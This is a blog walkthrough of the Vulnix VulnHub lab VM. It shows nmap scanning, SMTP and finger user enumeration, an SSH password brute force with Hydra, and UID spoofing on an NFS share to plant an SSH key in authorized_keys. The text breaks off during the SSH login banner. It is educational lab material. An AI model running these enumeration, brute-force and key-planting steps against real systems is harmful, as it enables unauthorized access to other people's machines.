<div dir="ltr" style="text-align: left;" trbidi="on">Vulnix is a challenging vulnerable VM, you can download it from https://www.vulnhub.com/entry/hacklab-vulnix,48/<br /><br />Thanks to <a href="https://www.rebootuser.com/">Rebootuser </a>for creating this fun challenge!<br /><br />I assume the VM is loaded correctly and DHCP successfully assigned it an IP. The VM needs to be on the same network as the attacking machine as well, probably by Bridged connection.<br /><h2 style="text-align: left;">0. Get VM's IP</h2><div style="text-align: left;">An easy way for this is running netdiscover on the subnet your machine is on. Keep in mind that this could fail due to various reasons, so nmap with -F -Pn for the subnet is a good alternative. </div><h2 style="text-align: left;"><!-- HTML generated using hilite.me --><div style="background: #ffffff; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid gray; overflow: auto; padding: 0.2em 0.6em; width: auto;"><table><tbody><tr><td><pre style="line-height: 125%; margin: 0;"> 1<br /> 2<br /> 3<br /> 4<br /> 5<br /> 6<br /> 7<br /> 8<br /> 9<br />10<br /></pre></td><td><pre style="line-height: 125%; margin: 0;"><span style="color: #c65d09; font-weight: bold;">root@kali:~#</span> netdiscover -r 192.168.1.0/24<br /><span style="color: #888888;">Currently scanning: Finished!   |   Screen View: Unique Hosts                                                        </span><br /><span style="color: #888888;">                                                                                                                      </span><br /><span style="color: #888888;"> 264 Captured ARP Req/Rep packets, from 5 hosts.   Total size: 15840                                                  </span><br /><span style="color: #888888;"> _____________________________________________________________________________</span><br /><span style="color: #888888;">   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      </span><br /><span style="color: #888888;"> -----------------------------------------------------------------------------</span><br /><span style="color: #888888;"> ...                                      </span><br /><span style="color: #888888;"> 192.168.1.72    c4:e9:84:10:d3:5e      4     240  TP-LINK TECHNOLOGIES CO.,LTD.                                      </span><br /><span style="color: #888888;"> ...</span><br /></pre></td></tr></tbody></table></div></h2><div style="text-align: left;"></div><div style="text-align: left;">VMs IP is: 192.168.1.72</div><h2 style="text-align: left;">1. Enumeration</h2><div style="text-align: left;">Enumeration is an important part of pentesting, debatable to be the most important step. In this step we'll be enumeration services running on victim as well as users, shares, RPC info, ...</div><h3 style="text-align: left;">1.1 Services Enumeration</h3><h4 style="text-align: left;">1.1.1 All ports TCP scan&nbsp;</h4><div style="text-align: left;">You don't usually need to scan all ports, top 1000 are usually good for starting, but in this example all ports will be scanned for TCP services.</div><div style="text-align: left;"><br /></div><!-- HTML generated using hilite.me --><br /><div style="background: #ffffff; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid gray; overflow: auto; padding: 0.2em 0.6em; width: auto;"><table><tbody><tr><td><pre style="line-height: 125%; margin: 0;"> 1<br /> 2<br /> 3<br /> 4<br /> 5<br /> 6<br /> 7<br /> 8<br /> 9<br />10<br />11<br />12<br />13<br />14<br />15<br />16<br />17<br />18<br />19<br />20<br />21<br />22<br />23<br />24<br />25<br />26<br />27<br />28<br />29<br />30<br />31<br />32<br />33<br />34<br />35<br />36<br />37<br />38<br />39<br />40<br />41<br />42<br />43<br />44<br />45<br />46<br />47<br />48<br />49<br />50<br />51<br />52<br />53<br />54<br />55<br />56<br />57<br />58<br />59<br />60<br />61<br />62<br />63<br />64<br />65<br />66<br />67<br />68<br />69<br />70<br />71<br />72<br />73<br />74<br />75<br />76<br />77<br />78<br />79<br />80<br />81<br />82<br />83<br />84<br />85<br />86<br />87<br />88<br />89</pre></td><td><pre style="line-height: 125%; margin: 0;"><span style="color: #c65d09; font-weight: bold;">root@kali:~#</span> nmap -p- -sS -A 192.168.1.72<br /><br /><span style="color: #888888;">Starting Nmap 7.30 ( https://nmap.org ) at 2016-10-30 20:12 EDT</span><br /><span style="color: #888888;">Nmap scan report for 192.168.1.72</span><br /><span style="color: #888888;">Host is up (0.00026s latency).</span><br /><span style="color: #888888;">Not shown: 65518 closed ports</span><br /><span style="color: #888888;">PORT      STATE SERVICE    VERSION</span><br /><b><span style="color: #888888;">22/tcp    open  ssh        OpenSSH 5.9p1 Debian 5ubuntu1 (Ubuntu Linux; protocol 2.0)</span></b><br /><span style="color: #888888;">| ssh-hostkey: </span><br /><span style="color: #888888;">|   1024 10:cd:9e:a0:e4:e0:30:24:3e:bd:67:5f:75:4a:33:bf (DSA)</span><br /><span style="color: #888888;">|   2048 bc:f9:24:07:2f:cb:76:80:0d:27:a6:48:52:0a:24:3a (RSA)</span><br /><span style="color: #888888;">|_  256 4d:bb:4a:c1:18:e8:da:d1:82:6f:58:52:9c:ee:34:5f (ECDSA)</span><br /><b><span style="color: #888888;">25/tcp    open  smtp       Postfix smtpd</span></b><br /><span style="color: #888888;">|_smtp-commands: vulnix, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, </span><br /><span style="color: #888888;">| ssl-cert: Subject: commonName=vulnix</span><br /><span style="color: #888888;">| Not valid before: 2012-09-02T17:40:12</span><br /><span style="color: #888888;">|_Not valid after:  2022-08-31T17:40:12</span><br /><span style="color: #888888;">|_ssl-date: 2016-10-31T00:13:39+00:00; +4s from scanner time.</span><br /><span style="color: #888888;">79/tcp    open  finger     Linux fingerd</span><br /><span style="color: #888888;">|_finger: No one logged on.\x0D</span><br /><b><span style="color: #888888;">110/tcp   open  pop3       Dovecot pop3d</span></b><br /><span style="color: #888888;">|_pop3-capabilities: RESP-CODES SASL STLS CAPA UIDL PIPELINING TOP</span><br /><span style="color: #888888;">| ssl-cert: Subject: commonName=vulnix/organizationName=Dovecot mail server</span><br /><span style="color: #888888;">| Not valid before: 2012-09-02T17:40:22</span><br /><span style="color: #888888;">|_Not valid after:  2022-09-02T17:40:22</span><br /><span style="color: #888888;">|_ssl-date: 2016-10-31T00:13:39+00:00; +4s from scanner time.</span><br /><b><span style="color: #888888;">111/tcp   open  rpcbind    2-4 (RPC #100000)</span></b><br /><span style="color: #888888;">| rpcinfo: </span><br /><span style="color: #888888;">|   program version   port/proto  service</span><br /><span style="color: #888888;">|   100000  2,3,4        111/tcp  rpcbind</span><br /><span style="color: #888888;">|   100000  2,3,4        111/udp  rpcbind</span><br /><span style="color: #888888;">|   100003  2,3,4       2049/tcp  nfs</span><br /><span style="color: #888888;">|   100003  2,3,4       2049/udp  nfs</span><br /><span style="color: #888888;">|   100005  1,2,3      48347/tcp  mountd</span><br /><span style="color: #888888;">|   100005  1,2,3      49907/udp  mountd</span><br /><span style="color: #888888;">|   100021  1,3,4      38110/udp  nlockmgr</span><br /><span style="color: #888888;">|   100021  1,3,4      57686/tcp  nlockmgr</span><br /><span style="color: #888888;">|   100024  1          57991/udp  status</span><br /><span style="color: #888888;">|   100024  1          60005/tcp  status</span><br /><span style="color: #888888;">|   100227  2,3         2049/tcp  nfs_acl</span><br /><span style="color: #888888;">|_  100227  2,3         2049/udp  nfs_acl</span><br /><b><span style="color: #888888;">143/tcp   open  imap       Dovecot imapd</span></b><br /><span style="color: #888888;">|_imap-capabilities: ENABLE more post-login STARTTLS LOGIN-REFERRALS IDLE LOGINDISABLEDA0001 LITERAL+ SASL-IR capabilities IMAP4rev1 listed Pre-login have ID OK</span><br /><span style="color: #888888;">| ssl-cert: Subject: commonName=vulnix/organizationName=Dovecot mail server</span><br /><span style="color: #888888;">| Not valid before: 2012-09-02T17:40:22</span><br /><span style="color: #888888;">|_Not valid after:  2022-09-02T17:40:22</span><br /><span style="color: #888888;">|_ssl-date: 2016-10-31T00:13:39+00:00; +4s from scanner time.</span><br /><b><span style="color: #888888;">512/tcp   open  exec       netkit-rsh rexecd</span><br /><span style="color: #888888;">513/tcp   open  login?</span><br /><span style="color: #888888;">514/tcp   open  tcpwrapped</span><br /><span style="color: #888888;">993/tcp   open  ssl/imap   Dovecot imapd</span></b><br /><span style="color: #888888;">|_imap-capabilities: more AUTH=PLAINA0001 listed LOGIN-REFERRALS IDLE post-login LITERAL+ SASL-IR capabilities IMAP4rev1 Pre-login ENABLE have ID OK</span><br /><span style="color: #888888;">| ssl-cert: Subject: commonName=vulnix/organizationName=Dovecot mail server</span><br /><span style="color: #888888;">| Not valid before: 2012-09-02T17:40:22</span><br /><span style="color: #888888;">|_Not valid after:  2022-09-02T17:40:22</span><br /><span style="color: #888888;">|_ssl-date: 2016-10-31T00:13:39+00:00; +5s from scanner time.</span><br /><b><span style="color: #888888;">995/tcp   open  ssl/pop3   Dovecot pop3d</span></b><br /><span style="color: #888888;">|_pop3-capabilities: RESP-CODES USER SASL(PLAIN) CAPA UIDL PIPELINING TOP</span><br /><span style="color: #888888;">| ssl-cert: Subject: commonName=vulnix/organizationName=Dovecot mail server</span><br /><span style="color: #888888;">| Not valid before: 2012-09-02T17:40:22</span><br /><span style="color: #888888;">|_Not valid after:  2022-09-02T17:40:22</span><br /><span style="color: #888888;">|_ssl-date: 2016-10-31T00:13:39+00:00; +5s from scanner time.</span><br /><b><span style="color: #888888;">2049/tcp  open  nfs_acl    2-3 (RPC #100227)</span><br /><span style="color: #888888;">37660/tcp open  mountd     1-3 (RPC #100005)</span><br /><span style="color: #888888;">44588/tcp open  mountd     1-3 (RPC #100005)</span><br /><span style="color: #888888;">48347/tcp open  mountd     1-3 (RPC #100005)</span><br /><span style="color: #888888;">57686/tcp open  nlockmgr   1-4 (RPC #100021)</span><br /><span style="color: #888888;">60005/tcp open  status     1 (RPC #100024)</span></b><br /><span style="color: #888888;">MAC Address: C4:E9:84:10:D3:5E (Tp-link Technologies)</span><br /><span style="color: #888888;">Device type: general purpose</span><br /><b><span style="color: #888888;">Running: Linux 2.6.X|3.X</span><br /><span style="color: #888888;">OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3</span><br /><span style="color: #888888;">OS details: Linux 2.6.32 - 3.10</span></b><br /><span style="color: #888888;">Network Distance: 1 hop</span><br /><span style="color: #888888;">Service Info: Host:  vulnix; OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br /><br /><span style="color: #888888;">Host script results:</span><br /><span style="color: #888888;">|_clock-skew: mean: 4s, deviation: 1s, median: 4s</span><br /><br /><span style="color: #888888;">TRACEROUTE</span><br /><span style="color: #888888;">HOP RTT     ADDRESS</span><br /><span style="color: #888888;">1   0.26 ms 192.168.1.72</span><br /><br /><span style="color: #888888;">Post-scan script results:</span><br /><span style="color: #888888;">| clock-skew: </span><br /><span style="color: #888888;">|_  4s: Majority of systems scanned</span><br /><span style="color: #888888;">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br /><span style="color: #888888;">Nmap done: 1 IP address (1 host up) scanned in 52.03 seconds</span><br /><span style="color: #c65d09; font-weight: bold;">root@kali:~#</span> <br /></pre></td></tr></tbody></table></div><div style="text-align: left;"><br />Great, we got many services running, notables are:<br /><ul style="text-align: left;"><li>Port 22: SSH</li><li>Port 25: SMTP</li><li>Port 79: Finger</li><li>Port 110: POP3</li><li>Port 111: RPCbind</li><li>Port 143: IMAP</li><li>Port 512: RSH (Remote shell)</li><li>Port 513: RLogin</li><li>Port 514: shell?</li></ul><h3 style="text-align: left;">1.2 Users enumeration</h3>&nbsp;A useful tool for enumeration (including user enum) would be <b>enum4linux. </b>Unfortunately, it didn't reveal any useful information.<br /><br />Since we have SMTP service running maybe we can also make use of the VRFY command if it's not disabled.<br /><br /><!-- HTML generated using hilite.me --><br /><div style="background: #ffffff; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid gray; overflow: auto; padding: 0.2em 0.6em; width: auto;"><table><tbody><tr><td><pre style="line-height: 125%; margin: 0;">1<br />2<br />3<br />4<br />5<br />6<br />7</pre></td><td><pre style="line-height: 125%; margin: 0;"><span style="color: #c65d09; font-weight: bold;">root@kali:~#</span> nc -nv 192.168.1.72 25<br /><span style="color: #888888;">(UNKNOWN) [192.168.1.72] 25 (smtp) open</span><br /><span style="color: #888888;">220 vulnix ESMTP Postfix (Ubuntu)</span><br /><span style="color: #888888;">VRFY vulnix</span><br /><span style="color: #888888;">252 2.0.0 vulnix</span><br /><span style="color: #888888;">VRFY abatchy</span><br /><span style="color: #888888;">550 5.1.1 &lt;abatchy&gt;: Recipient address rejected: User unknown in local recipient table</span><br /></pre></td></tr></tbody></table></div>We were able to verify that the user vulnix exists, verifying a non existing user shows us an error message. We might be able to enumerate more users using this method. For that we'll use the sexy <a href="http://tools.kali.org/information-gathering/smtp-user-enum">smtp-user-enum</a> script found in Kali.<br /><br />We can use /usr/share/metasploit-framework/data/wordlists/unix_users.txt which is provided in the metasploit framework.<br /><br /><!-- HTML generated using hilite.me --><br /><div style="background: #ffffff; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid gray; overflow: auto; padding: 0.2em 0.6em; width: auto;"><table><tbody><tr><td><pre style="line-height: 125%; margin: 0;"> 1<br /> 2<br /> 3<br /> 4<br /> 5<br /> 6<br /> 7<br /> 8<br /> 9<br />10<br />11<br />12<br />13<br />14<br />15<br />16<br />17<br />18<br />19<br />20<br />21<br />22<br />23<br />24<br />25<br />26<br />27<br />28<br />29<br />30<br />31<br />32<br />33<br />34<br />35<br />36<br />37<br />38<br />39<br />40<br />41<br />42<br />43<br />44<br />45<br />46<br />47</pre></td><td><pre style="line-height: 125%; margin: 0;"><span style="color: #c65d09; font-weight: bold;">root@kali:~#</span> smtp-user-enum -M VRFY -U /usr/share/metasploit-framework/data/wordlists/unix_users.txt -t 192.168.1.72<br /><span style="color: #888888;">Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )</span><br /><br /><span style="color: #888888;"> ----------------------------------------------------------</span><br /><span style="color: #888888;">|                   Scan Information                       |</span><br /><span style="color: #888888;"> ----------------------------------------------------------</span><br /><br /><span style="color: #888888;">Mode ..................... VRFY</span><br /><span style="color: #888888;">Worker Processes ......... 5</span><br /><span style="color: #888888;">Usernames file ........... /usr/share/metasploit-framework/data/wordlists/unix_users.txt</span><br /><span style="color: #888888;">Target count ............. 1</span><br /><span style="color: #888888;">Username count ........... 112</span><br /><span style="color: #888888;">Target TCP port .......... 25</span><br /><span style="color: #888888;">Query timeout ............ 5 secs</span><br /><span style="color: #888888;">Target domain ............ </span><br /><br /><span style="color: #c65d09; font-weight: bold;">#</span><span style="color: #666666; font-style: italic;">####### Scan started at Sun Oct 30 23:10:22 2016 #########</span><br /><span style="color: #888888;">192.168.1.72: ROOT exists</span><br /><span style="color: #888888;">192.168.1.72: backup exists</span><br /><span style="color: #888888;">192.168.1.72: bin exists</span><br /><span style="color: #888888;">192.168.1.72: daemon exists</span><br /><span style="color: #888888;">192.168.1.72: games exists</span><br /><span style="color: #888888;">192.168.1.72: gnats exists</span><br /><span style="color: #888888;">192.168.1.72: irc exists</span><br /><span style="color: #888888;">192.168.1.72: libuuid exists</span><br /><span style="color: #888888;">192.168.1.72: list exists</span><br /><span style="color: #888888;">192.168.1.72: lp exists</span><br /><span style="color: #888888;">192.168.1.72: man exists</span><br /><span style="color: #888888;">192.168.1.72: messagebus exists</span><br /><span style="color: #888888;">192.168.1.72: mail exists</span><br /><span style="color: #888888;">192.168.1.72: news exists</span><br /><span style="color: #888888;">192.168.1.72: nobody exists</span><br /><span style="color: #888888;">192.168.1.72: postmaster exists</span><br /><span style="color: #888888;">192.168.1.72: proxy exists</span><br /><span style="color: #888888;">192.168.1.72: root exists</span><br /><span style="color: #888888;">192.168.1.72: sshd exists</span><br /><span style="color: #888888;">192.168.1.72: sync exists</span><br /><span style="color: #888888;">192.168.1.72: sys exists</span><br /><span style="color: #888888;">192.168.1.72: syslog exists</span><br /><b><span style="color: #888888;">192.168.1.72: user exists</span></b><br /><span style="color: #888888;">192.168.1.72: uucp exists</span><br /><span style="color: #888888;">192.168.1.72: www-data exists</span><br /><i><span style="color: #666666;">#</span></i><span style="color: #666666; font-style: italic;">####### Scan completed at Sun Oct 30 23:10:23 2016 #########</span><br /><span style="color: #888888;">25 results.</span><br /><br /><span style="color: #888888;">112 queries in 1 seconds (112.0 queries / sec)</span><br /><span style="color: #c65d09; font-weight: bold;">root@kali:~#</span> <br /></pre></td></tr></tbody></table></div><br />Took me a while to figure out, but the username user is not a common one.<br />Let's try running <a href="https://en.wikipedia.org/wiki/Finger_protocol">finger </a>against the two usernames we found (vulnix and user).<br /><br /><!-- HTML generated using hilite.me --><br /><div style="background: #ffffff; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid gray; overflow: auto; padding: 0.2em 0.6em; width: auto;"><table><tbody><tr><td><pre style="line-height: 125%; margin: 0;"> 1<br /> 2<br /> 3<br /> 4<br /> 5<br /> 6<br /> 7<br /> 8<br /> 9<br />10<br />11<br />12<br />13<br />14<br />15<br />16<br />17<br />18</pre></td><td><pre style="line-height: 125%; margin: 0;"><span style="color: #c65d09; font-weight: bold;">root@kali:~#</span> finger user@192.168.1.72<br /><span style="color: #888888;">Login: user              Name: user</span><br /><span style="color: #888888;">Directory: /home/user                Shell: /bin/bash</span><br /><span style="color: #888888;">Never logged in.</span><br /><span style="color: #888888;">No mail.</span><br /><span style="color: #888888;">No Plan.</span><br /><br /><span style="color: #888888;">Login: dovenull          Name: Dovecot login user</span><br /><span style="color: #888888;">Directory: /nonexistent              Shell: /bin/false</span><br /><span style="color: #888888;">Never logged in.</span><br /><span style="color: #888888;">No mail.</span><br /><span style="color: #888888;">No Plan.</span><br /><span style="color: #c65d09; font-weight: bold;">root@kali:~#</span> finger vulnix@192.168.1.72<br /><span style="color: #888888;">Login: vulnix            Name: </span><br /><span style="color: #888888;">Directory: /home/vulnix              Shell: /bin/bash</span><br /><span style="color: #888888;">Never logged in.</span><br /><span style="color: #888888;">No mail.</span><br /><span style="color: #888888;">No Plan.</span><br /></pre></td></tr></tbody></table></div><br />Good, both users are valid.<br /><br /><h3 style="text-align: left;">1.3 NFS enumeration</h3>Since we have NFS service running on port 2069, we may be able to mount a share and find some juicy data!<br />You'll need to install <b>nfs-common</b> package if it doesn't exist already.<br /><br /><!-- HTML generated using hilite.me --><br /><div style="background: #ffffff; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid gray; overflow: auto; padding: 0.2em 0.6em; width: auto;"><table><tbody><tr><td><pre style="line-height: 125%; margin: 0;"> 1<br /> 2<br /> 3<br /> 4<br /> 5<br /> 6<br /> 7<br /> 8<br /> 9<br />10<br />11<br />12<br />13<br />14<br />15<br />16<br />17<br />18<br />19<br />20<br />21<br /></pre></td><td><pre style="line-height: 125%; margin: 0;"><span style="color: #c65d09; font-weight: bold;">root@kali:~#</span> showmount -h<br /><span style="color: #888888;">Usage: showmount [-adehv]</span><br /><span style="color: #888888;">       [--all] [--directories] [--exports]</span><br /><span style="color: #888888;">       [--no-headers] [--help] [--version] [host]</span><br /><span style="color: #c65d09; font-weight: bold;">root@kali:~#</span> showmount 192.168.1.72<br /><span style="color: #888888;">Hosts on 192.168.1.72:</span><br /><span style="color: #c65d09; font-weight: bold;">root@kali:~#</span> showmount -e 192.168.1.72<br /><span style="color: #888888;">Export list for 192.168.1.72:</span><br /><span style="color: #888888;">/home/vulnix *</span><br /><span style="color: #c65d09; font-weight: bold;">root@kali:~#</span> mkdir /tmp/nfs<br /><span style="color: #c65d09; font-weight: bold;">root@kali:~#</span> mount -t nfs 192.168.1.72:/home/vulnix /tmp/nfs -nolock<br /><span style="color: #c65d09; font-weight: bold;">root@kali:~#</span> <span style="color: #007722;">cd</span> /tmp<br /><span style="color: #c65d09; font-weight: bold;">root@kali:/tmp#</span> ls -al<br /><span style="color: #888888;">total 52</span><br /><span style="color: #888888;">drwxrwxrwt 12 root       root       4096 Oct 30 23:22 .</span><br /><span style="color: #888888;">drwxr-xr-x 22 root       root       4096 Sep 29 03:47 ..</span><br /><span style="color: #888888;">...</span><br /><span style="color: #888888;">drwxr-x---  2 nobody     4294967294 4096 Sep  2  2012 nfs</span><br /><span style="color: #888888;">...</span><br /><span style="color: #c65d09; font-weight: bold;">root@kali:/tmp#</span> <span style="color: #007722;">cd</span> /tmp/nfs<br /><span style="color: #888888;">bash: cd: /tmp/nfs: Permission denied</span><br /></pre></td></tr></tbody></table></div><br />The mounted share cannot be accessed, probably because the <a href="https://access.redhat.com/documentation/en-US/Red_Hat_Enterprise_Linux/6/html/Security_Guide/sect-Security_Guide-Securing_NFS-Do_Not_Use_the_no_root_squash_Option.html">root_squash flag is set</a>. We can safely assume if we have a user named vulnix with the same UID we'll be able to access it. But we'll get back to this later.<br /><h2 style="text-align: left;">2. Gaining Access</h2><div style="text-align: left;">After wasting a decent amount of time on finding exploits for running services, I wasn't able to find any, don't do that, there are services we didn't explore more properly in the first place.</div><div style="text-align: left;"><br /></div><h3 style="text-align: left;">2.1 Bruteforcing SSH</h3><div style="text-align: left;">Running Hydra against either user or vulnix is an option with rockyou wordlist, although this will take a very long time (unless you try user 'user' first)! </div><!-- HTML generated using hilite.me --><br /><div style="background: #ffffff; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid gray; overflow: auto; padding: 0.2em 0.6em; width: auto;"><table><tbody><tr><td><pre style="line-height: 125%; margin: 0;"> 1<br /> 2<br /> 3<br /> 4<br /> 5<br /> 6<br /> 7<br /> 8<br /> 9<br />10<br />11<br />12<br />13</pre></td><td><pre style="line-height: 125%; margin: 0;"><span style="color: #c65d09; font-weight: bold;">root@kali:~#</span> hydra -l user -P rockyou.txt 192.168.1.72 ssh -t 4<br /><span style="color: #888888;">Hydra v8.3 (c) 2016 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.</span><br /><br /><span style="color: #888888;">Hydra (http://www.thc.org/thc-hydra) starting at 2016-10-30 23:43:08</span><br /><span style="color: #888888;">[DATA] max 4 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~56032 tries per task</span><br /><span style="color: #888888;">[DATA] attacking service ssh on port 22</span><br /><span style="color: #888888;">[STATUS] 64.00 tries/min, 64 tries in 00:01h, 14344335 to do in 3735:31h, 4 active</span><br /><span style="color: #888888;">[STATUS] 61.33 tries/min, 184 tries in 00:03h, 14344215 to do in 3897:54h, 4 active</span><br /><span style="color: #888888;">[STATUS] 60.71 tries/min, 425 tries in 00:07h, 14343974 to do in 3937:34h, 4 active</span><br /><span style="color: #6aa84f;"><span style="color: #888888;">[22][ssh] host: 192.168.1.72   login: user   password: letmein</span></span><br /><span style="color: #888888;">1 of 1 target successfully completed, 1 valid password found</span><br /><span style="color: #888888;">Hydra (http://www.thc.org/thc-hydra) finished at 2016-10-30 23:51:39</span><br /><span style="color: #c65d09; font-weight: bold;">root@kali:~#</span> <br /></pre></td></tr></tbody></table></div><div style="text-align: left;"><br /><h3 style="text-align: left;">2.2 Privilege escalation P1</h3><div style="text-align: left;">We can now ssh into the victim's machine as user <b>user </b>but there's not much to do unfortunately. GCC isn't installed so a local rootkit won't work since they're written in C.<br /><br />If you navigate to /home you'll notice the shared directory we couldn't access earlier. Why don't we try to get the UID for vulnix and create a temporary user on our system and access it?</div><div style="text-align: left;"><!-- HTML generated using hilite.me --><br /><div style="background: #ffffff; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid gray; overflow: auto; padding: 0.2em 0.6em; width: auto;"><table><tbody><tr><td><pre style="line-height: 125%; margin: 0;"> 1<br /> 2<br /> 3<br /> 4<br /> 5<br /> 6<br /> 7<br /> 8<br /> 9<br />10<br />11<br />12<br />13<br />14<br />15<br />16<br />17<br />18<br />19<br />20<br />21<br />22<br />23<br />24<br />25</pre></td><td><pre style="line-height: 125%; margin: 0;"><span style="color: #c65d09; font-weight: bold;">user@vulnix:/home$</span> id vulnix<br /><span style="color: #888888;">uid=2008(vulnix) gid=2008(vulnix) groups=2008(vulnix)</span><br /><span style="color: #c65d09; font-weight: bold;">user@vulnix:/home$</span> <span style="color: #007722;">exit</span><br /><span style="color: #888888;">logout</span><br /><span style="color: #888888;">Connection to 192.168.1.72 closed.</span><br /><span style="color: #c65d09; font-weight: bold;">root@kali:~#</span> useradd -u 2008 vulnix<br /><span style="color: #c65d09; font-weight: bold;">root@kali:~#</span> mkdir /tmp/mnt<br /><span style="color: #c65d09; font-weight: bold;">root@kali:~#</span> mount -t nfs 192.168.1.72:/home/vulnix /tmp/mnt -nolock<br /><span style="color: #c65d09; font-weight: bold;">root@kali:~#</span> <span style="color: #007722;">cd</span> /tmp/mnt<br /><span style="color: #888888;">bash: cd: /tmp/mnt: Permission denied</span><br /><span style="color: #c65d09; font-weight: bold;">root@kali:~#</span> su vulnix<br /><span style="color: #c65d09; font-weight: bold;">$</span> whoami<br /><span style="color: #888888;">vulnix</span><br /><span style="color: #c65d09; font-weight: bold;">$</span> id<br /><span style="color: #888888;">uid=2008(vulnix) gid=2008(vulnix) groups=2008(vulnix)</span><br /><span style="color: #c65d09; font-weight: bold;">$</span> <span style="color: #007722;">cd</span> /tmp/mnt<br /><span style="color: #c65d09; font-weight: bold;">$</span> ls<br /><span style="color: #c65d09; font-weight: bold;">$</span> ls -al<br /><span style="color: #888888;">total 20</span><br /><span style="color: #888888;">drwxr-x---  2 vulnix vulnix 4096 Sep  2  2012 .</span><br /><span style="color: #888888;">drwxrwxrwt 12 root   root   4096 Oct 31 00:03 ..</span><br /><span style="color: #888888;">-rw-r--r--  1 vulnix vulnix  220 Apr  3  2012 .bash_logout</span><br /><span style="color: #888888;">-rw-r--r--  1 vulnix vulnix 3486 Apr  3  2012 .bashrc</span><br /><span style="color: #888888;">-rw-r--r--  1 vulnix vulnix  675 Apr  3  2012 .profile</span><br /><span style="color: #c65d09; font-weight: bold;">$</span> <br /></pre></td></tr></tbody></table></div><br />Let's generate keys for SSH so we can login into vulnix!<br /><br />Steps:<br /><ol style="text-align: left;"><li>Create ssh key pair by running ssh-keygen</li><li>Create .ssh directory on the mounted share (/home/vulnix/.ssh)</li><li>Copy the content of the public key to /home/vulnix/.ssh</li><li>SSH into vulnix@&lt;victim_ip&gt;!</li></ol><!-- HTML generated using hilite.me --><br /><div style="background: #ffffff; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid gray; overflow: auto; padding: 0.2em 0.6em; width: auto;"><table><tbody><tr><td><pre style="line-height: 125%; margin: 0;"> 1<br /> 2<br /> 3<br /> 4<br /> 5<br /> 6<br /> 7<br /> 8<br /> 9<br />10<br />11<br />12<br />13<br />14<br />15<br />16<br />17<br />18<br />19<br />20<br />21<br />22<br />23<br />24<br />25<br />26<br />27<br />28<br />29<br />30<br />31<br />32<br />33<br />34<br />35<br />36<br />37<br />38<br />39<br />40<br />41<br />42<br />43<br />44<br />45<br />46<br />47<br />48<br />49<br />50<br />51<br />52<br />53<br />54<br />55<br />56<br />57<br />58</pre></td><td><pre style="line-height: 125%; margin: 0;"><span style="color: #c65d09; font-weight: bold;">root@kali:~#</span> ssh-keygen<br /><span style="color: #888888;">Generating public/private rsa key pair.</span><br /><span style="color: #888888;">Enter file in which to save the key (/root/.ssh/id_rsa): </span><br /><span style="color: #888888;">Enter passphrase (empty for no passphrase): </span><br /><span style="color: #888888;">Enter same passphrase again: </span><br /><span style="color: #888888;">Your identification has been saved in /root/.ssh/id_rsa.</span><br /><span style="color: #888888;">Your public key has been saved in /root/.ssh/id_rsa.pub.</span><br /><span style="color: #888888;">The key fingerprint is:</span><br /><span style="color: #888888;">SHA256:jAQAkGBjXyvc8yD2eGxR1fxY1z3nh/rxUFfuyfH3Uoc root@kali</span><br /><span style="color: #888888;">The key's randomart image is:</span><br /><span style="color: #888888;">+---[RSA 2048]----+</span><br /><span style="color: #888888;">|**.... ...o     o|</span><br /><span style="color: #888888;">|+ + o.o    o . o=|</span><br /><span style="color: #888888;">|   * *.     + .++|</span><br /><span style="color: #888888;">|  . *.=o   . ...*|</span><br /><span style="color: #888888;">|   . =..S    ..+*|</span><br /><span style="color: #888888;">|    o       . Eo*|</span><br /><span style="color: #888888;">|             . =+|</span><br /><span style="color: #888888;">|              o o|</span><br /><span style="color: #888888;">|               . |</span><br /><span style="color: #888888;">+----[SHA256]-----+</span><br /><span style="color: #c65d09; font-weight: bold;">root@kali:~#</span> <span style="color: #007722;">cd</span> .ssh<br /><span style="color: #c65d09; font-weight: bold;">root@kali:~/.ssh#</span> ls<br /><span style="color: #888888;">id_rsa  id_rsa.pub  known_hosts</span><br /><span style="color: #c65d09; font-weight: bold;">root@kali:~/.ssh#</span> su vulnix<br /><span style="color: #c65d09; font-weight: bold;">$</span> <span style="color: #007722;">cd</span> /tmp/mnt<br /><span style="color: #c65d09; font-weight: bold;">$</span> mkdir .ssh<br /><span style="color: #c65d09; font-weight: bold;">$</span> <span style="color: #007722;">cd</span> .ssh<br /><span style="color: #c65d09; font-weight: bold;">$</span> <span style="color: #007722;">echo </span>ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDV+bAWn9J+xwfVKkNd/TpwysAEVAU321XBxwc0qt8OXRJZC71/UOr/2m/QCeneJH/o0d4IiaZSJQWOTwVlpRvBeTLTRLu8T5OgOGjTF2TEL6Z8ILif2RS5QuPjFRRoW4TOvApNbcqpzkVtXcCQLlxXkO1KNA01LapaTfhh48l+bpzjlujFQTaw3m5FXB1aQASkweZLwF2T0+2anvX0gtB2QKwePbwb4zEIpcVHrucCe3j9Z2KYE7GcyJiOEUEyXi39GsypR3fRCcJTx2/TXkhByjkYgFJjnoBd/koMfpnWjtVHj+d6y97f1Srkrv+RB5mNiYcMN+W4bAU2m11163kr root@kali &gt; authorized_keys<br /><span style="color: #c65d09; font-weight: bold;">$</span> <span style="color: #007722;">exit</span><br /><span style="color: #c65d09; font-weight: bold;">root@kali:~/.ssh#</span><span style="color: #007722;"> </span>ssh vulnix@192.168.1.72<br /><span style="color: #888888;">Welcome to Ubuntu 12.04.1 LTS (GNU/Linux 3.2.0-29-generic-pae i686)</span><br /><br /><span style="color: #888888;"> * Documentation:  https://help.ubuntu.com/</span><br /><br /><span style="color: #888888;">  System information as of Mon Oct 31 04:09:44 GMT 